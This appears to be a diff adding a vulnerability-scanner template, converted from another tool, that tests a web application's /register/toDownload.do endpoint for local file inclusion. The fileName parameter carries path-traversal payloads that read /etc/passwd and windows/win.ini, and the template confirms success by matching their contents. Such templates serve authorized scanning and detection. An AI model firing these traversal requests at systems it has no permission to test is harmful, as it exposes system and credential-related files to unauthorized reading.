@@ -1,0 +1,36 @@
+id: yaml-poc-hst-hst-readfile-CT-158007
+info:
+  name: Yaml Poc Hst Hst Readfile Ct 158007
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-hst-hst-readfile-CT-158007'
+  tags: lfi
+  reference: []
+http:
+- method: GET
+  path:
+  - /register/toDownload.do?fileName=../../../../../../../../../../../../../../etc/passwd
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: regex
+    part: body
+    regex:
+    - 'root:[x*]:0:0:'
+- method: GET
+  path:
+  - /register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - for 16-bit app support
+    - '[extensions]'
